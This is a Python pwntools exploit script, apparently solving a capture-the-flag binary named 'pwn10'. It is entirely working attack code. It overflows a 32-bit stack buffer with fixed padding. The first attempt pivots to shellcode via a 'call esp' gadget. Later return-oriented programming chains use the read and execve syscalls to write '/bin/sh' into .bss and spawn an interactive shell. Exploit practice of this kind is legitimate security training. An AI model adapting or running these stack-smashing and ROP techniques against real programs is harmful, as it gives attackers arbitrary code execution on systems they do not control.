from pwn import *

context.arch='i386'
context.log_level='debug'
io = process("./pwn10/pwn10")

io.recvuntil("Now , give me your key:")
io.sendline("0")

'''
0x080cb770 : call esp
0x080dfd93 : jmp esp
'''
jmp_esp = 0x080dfd93
call_esp = 0x080cb770
shellcode = asm(shellcraft.sh())
payload =  b"A" * (0x8c+4) + p32(call_esp) + shellcode

'''
0x080b9d86 : pop eax ; ret
0x08070380 : pop edx ; pop ecx ; pop ebx ; ret
0x0806df63 : int 0x80
.rodata:080C0778 aClflush        db 'clflush',0
'''
pop_eax_ret = 0x080b9d86
pop_edx_ecx_ebx_ret = 0x08070380
int_0x80 = 0x0806df63
sh_addr = 0x080c0778+5

payload = flat(b"A" * (0x8c+4), 
               pop_eax_ret, 0xb, 
               pop_edx_ecx_ebx_ret, 0, 0, sh_addr,
               int_0x80
               )


#bss段在最IDA的hex view的最下面：
bss_addr = 0x080ecfff
int_0x80_ret = 0x08070960
paddings = flat(b"A" * (0x8c+4))
syscall_read = flat(pop_eax_ret, 0x3,
                    pop_edx_ecx_ebx_ret, 8, bss_addr, 0,
                    int_0x80_ret)

# gdb.attach(io, api=True)

syscall = flat(pop_eax_ret, 0xb,
               pop_edx_ecx_ebx_ret, 0, 0, bss_addr,
               int_0x80 # int_0x80_ret
               )

io.sendline(paddings + syscall_read + syscall)

io.sendline(b"/bin/sh\x00")
io.interactive()
